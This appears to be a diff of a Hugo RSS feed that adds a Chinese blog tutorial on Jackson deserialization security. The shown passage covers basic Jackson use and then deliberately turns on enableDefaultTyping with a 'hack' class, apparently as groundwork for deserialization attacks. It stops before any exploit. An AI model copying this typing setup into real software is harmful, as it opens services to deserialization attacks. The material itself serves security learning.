@@ -7,6 +7,1440 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>一个俗人</copyright><atom:link href="https://gsygsr.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Jackson反序列化</title>
+        <link>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/</link>
+        <pubDate>Wed, 19 Feb 2025 14:57:07 +0800</pubDate>
+        
+        <guid>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/</guid>
+        <description>&lt;img src="https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/1.jpg" alt="Featured image of post Jackson反序列化" /&gt;&lt;h2 id=&#34;jackson-基本使用&#34;&gt;Jackson 基本使用
+&lt;/h2&gt;&lt;h3 id=&#34;jackson-简介&#34;&gt;Jackson 简介
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。&lt;/font&gt;&lt;/p&gt;
+&lt;h3 id=&#34;使用-jackson-进行序列化与反序列化&#34;&gt;使用 Jackson 进行序列化与反序列化
+&lt;/h3&gt;&lt;p&gt;依赖&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;dependencies&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;dependency&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;jackson-databind&amp;lt;/artifactId&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/dependency&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;dependency&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;jackson-core&amp;lt;/artifactId&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/dependency&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;dependency&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;artifactId&amp;gt;jackson-annotations&amp;lt;/artifactId&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/dependency&amp;gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/dependencies&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;新建一个Person类&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class Person {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public  int age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String toString() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return String.format(&amp;#34;Person.age=%d, Person.name=%s&amp;#34;, age, name);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Test类进行序列化和反序列化&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person person = new Person();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.age = 20;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String json = mapper.writeValueAsString(person);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person person1 = mapper.readValue(json,Person.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(person1);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;writeValueAsString&lt;/code&gt;:将java对象序列化为JSON字符串&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;readValue&lt;/code&gt;: 将 JSON 数据反序列化为 Java 对象的方法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734517194798-adfaf9a9-1896-4447-ba53-8cf185935aa4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;jackson-对于多态问题的解决--font-stylecolorrgb80-80-92jacksonpolymorphicdeserialization-机制font&#34;&gt;Jackson 对于多态问题的解决 —— &lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;JacksonPolymorphicDeserialization 机制&lt;/font&gt;
+&lt;/h2&gt;&lt;p&gt;假设有一个父类和多个子类，JSON 数据中可能会包含不同类型的对象。Jackson 提供了几种方式来支持多态反序列化，其中最常用的是使用 &lt;code&gt;@JsonTypeInfo&lt;/code&gt; 和 &lt;code&gt;@JsonSubTypes&lt;/code&gt; 注解。 &lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即 &lt;/font&gt;&lt;code&gt;DefaultTyping&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 和 &lt;/font&gt;&lt;code&gt;@JsonTypeInfo&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 注解&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;Jackson 提供一个 enableDefaultTyping 设置&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;包含四个值&lt;/font&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;JAVA_LANG_OBJECT&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;OBJECT_AND_NON_CONCRETE&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;NON_CONCRETE_AND_ARRAYS&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;NON_FINAL &lt;/font&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;java_lang_object&#34;&gt;JAVA_LANG_OBJECT
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;新建一个hack类&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734518160306-4912b4d1-fb7f-4673-a828-e14e92e37a93.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;修改Person类,添加Object类型属性&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public  int age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public String name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public Object object;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public String toString() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  return String.format(&amp;#34;Person.age=%d, Person.name=%s,%s&amp;#34;, age, name,object == null ? &amp;#34;null&amp;#34; : object);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;新建Test.java,添加&lt;code&gt;enableDefaultTyping()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 并设置为 &lt;/font&gt;&lt;code&gt;JAVA_LANG_OBJECT&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person person = new Person();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.age = 20;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.object = new hack();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String json = mapper.writeValueAsString(person);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person person1 = mapper.readValue(json, Person.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(person1);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734518639417-d3efd789-7655-444c-8528-6204ec8d4677.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;如果不设置&lt;code&gt;JAVA_LANG_OBJECT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734518630119-9d853862-2a74-46de-abff-56bd2a93eabe.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以发现设置了之后object属性被反序列化了,输出时是直接输出hack对象&lt;/p&gt;
+&lt;h4 id=&#34;object_and_non_concrete&#34;&gt;OBJECT_AND_NON_CONCRETE
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有 Interface、AbstractClass 类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;添加Sex接口&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public interface Sex {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void setSex(int sex);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public int getSex();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;新建MySex类继承Sex接口&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class MySex implements Sex{
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    int sex;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void setSex(int sex) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.sex = sex;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public int getSex() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return sex;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;修改Person类&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
